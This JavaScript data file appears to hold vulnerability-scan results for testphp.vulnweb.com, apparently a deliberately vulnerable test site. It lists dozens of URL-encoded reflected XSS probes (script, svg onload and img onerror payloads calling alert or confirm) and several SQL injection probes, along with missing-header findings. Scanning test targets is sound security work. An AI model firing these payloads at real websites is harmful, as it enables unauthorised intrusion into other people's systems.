const data = {
  technology: {
    webservers: "Nginx",
  },
  ip: "44.228.249.3",
  dir_count: 6,
  endpt_count: 41,
  ports: "[53, 80]",
  low: 25,
  medium: 50,
  high: 14,
  vulnerability: [
    {
      vuln: "SQL Injection - SQLite",
      severity: "High",
      vuln_url: "http://testphp.vulnweb.com:80/admin/?C=",
    },
    {
      vuln: "Cross Site Scripting (Reflected)",
      severity: "High",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E",
    },
    {
      vuln: "SQL Injection",
      severity: "High",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=3+AND+1%3D1+--+",
    },
    {
      vuln: "SQL Injection - MySQL",
      severity: "High",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=3",
    },
    {
      vuln: "php-detect",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "nginx-version",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "php-errors",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "tech-detect:dreamweaver",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "tech-detect:nginx",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "tech-detect:php",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "CVE-2020-2096",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2021-38702",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2021-40542",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2021-26475",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%272PMBS52wMj9MHvEDcCSruUbxV46%27)%3C/script%3E",
    },
    {
      vuln: "CVE-2002-1131",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-29395",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E",
    },
    {
      vuln: "sick-beard-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E",
    },
    {
      vuln: "CVE-2012-4768",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-11930",
      severity: "medium",
      vuln_url:
        'http://testphp.vulnweb.com/listproducts.php?cat=/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E<img%20src=x',
    },
    {
      vuln: "CVE-2021-30049",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/KeepAlive.jsp?stamp=16170297%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "top-xss-params",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?api=%27%3E%22%3Csvg%2Fonload=confirm%28%27api%27%29%3E&api_key=%27%3E%22%3Csvg%2Fonload=confirm%28%27api_key%27%29%3E&begindate=%27%3E%22%3Csvg%2Fonload=confirm%28%27begindate%27%29%3E&callback=%27%3E%22%3Csvg%2Fonload=confirm%28%27callback%27%29%3E&categoryid=%27%3E%22%3Csvg%2Fonload=confirm%28%27categoryid%27%29%3E&csrf_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27csrf_token%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27email%27%29%3E&emailto=%27%3E%22%3Csvg%2Fonload=confirm%28%27emailto%27%29%3E&enddate=%27%3E%22%3Csvg%2Fonload=confirm%28%27enddate%27%29%3E&immagine=%27%3E%22%3Csvg%2Fonload=confirm%28%27immagine%27%29%3E&item=%27%3E%22%3Csvg%2Fonload=confirm%28%27item%27%29%3E&jsonp=%27%3E%22%3Csvg%2Fonload=confirm%28%27jsonp%27%29%3E&l=%27%3E%22%3Csvg%2Fonload=confirm%28%27l%27%29%3E&lang=%27%3E%22%3Csvg%2Fonload=confirm%28%27lang%27%29%3E&list_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27list_type%27%29%3E",
    },
    {
      vuln: "top-xss-params",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E",
    },
    {
      vuln: "CVE-2020-19295",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-6171",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1",
    },
    {
      vuln: "CVE-2020-1943",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E",
    },
    {
      vuln: "CVE-2020-8512",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22",
    },
    {
      vuln: "CVE-2008-2398",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E",
    },
    {
      vuln: "CVE-2021-26247",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/auth_changepassword.php?ref=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-2140",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample",
    },
    {
      vuln: "CVE-2020-2140",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample",
    },
    {
      vuln: "CVE-2020-29164",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E",
    },
    {
      vuln: "CVE-2018-11709",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2017-18536",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "waf-detect:nginxgeneric",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php/?cat=",
    },
    {
      vuln: "http-missing-security-headers:permissions-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:clear-site-data",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:cross-origin-resource-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-allow-methods",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:content-security-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:x-frame-options",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:x-permitted-cross-domain-policies",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:referrer-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-allow-headers",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:strict-transport-security",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-expose-headers",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:cross-origin-opener-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:cross-origin-embedder-policy",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-allow-origin",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-allow-credentials",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:access-control-max-age",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "http-missing-security-headers:x-content-type-options",
      severity: "info",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=",
    },
    {
      vuln: "CVE-2007-5728",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test",
    },
    {
      vuln: "CVE-2019-15889",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc",
    },
    {
      vuln: "CVE-2017-7391",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C",
    },
    {
      vuln: "discourse-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/email/unsubscribed?email=test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E",
    },
    {
      vuln: "CVE-2021-37833",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1",
    },
    {
      vuln: "CVE-2018-13380",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E",
    },
    {
      vuln: "CVE-2021-26710",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E",
    },
    {
      vuln: "CVE-2018-5233",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "wems-manager-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E",
    },
    {
      vuln: "CVE-2020-19282",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/error?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2012-4889",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/fw/syslogViewer.do?port=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2019-15713",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2019-12461",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E",
    },
    {
      vuln: "CVE-2020-27982",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    },
    {
      vuln: "CVE-2021-35265",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2021-35265",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-15500",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E",
    },
    {
      vuln: "CVE-2021-24298",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2017-12794",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2018-8006",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68",
    },
    {
      vuln: "error-based-sql-injection:MySQL",
      severity: "critical",
      vuln_url: "http://testphp.vulnweb.com/listproducts.php?cat=/'",
    },
    {
      vuln: "nginx-module-vts-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-2036",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
    },
    {
      vuln: "CVE-2020-35774",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/admin/histograms?h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&fmt=plot_cdf&log_scale=true",
    },
    {
      vuln: "parentlink-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E",
    },
    {
      vuln: "parentlink-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E",
    },
    {
      vuln: "basic-xss-prober",
      severity: "low",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e",
    },
    {
      vuln: "CVE-2018-12095",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2012-4547",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E",
    },
    {
      vuln: "CVE-2019-0221",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E",
    },
    {
      vuln: "CVE-2019-0221",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E",
    },
    {
      vuln: "CVE-2016-10993",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-19283",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2021-40868",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2019-10475",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/plugin/build-metrics/getBuildStats?label=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search",
    },
    {
      vuln: "CVE-2020-28351",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME",
    },
    {
      vuln: "CVE-2019-7219",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E",
    },
    {
      vuln: "txt-fingerprint",
      severity: "info",
      vuln_url: "testphp.vulnweb.com",
    },
    {
      vuln: "global-domains-xss",
      severity: "high",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
    },
    {
      vuln: "CVE-2020-14413",
      severity: "medium",
      vuln_url:
        "http://testphp.vulnweb.com/listproducts.php?cat=/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
    },
  ],
};

export default data;
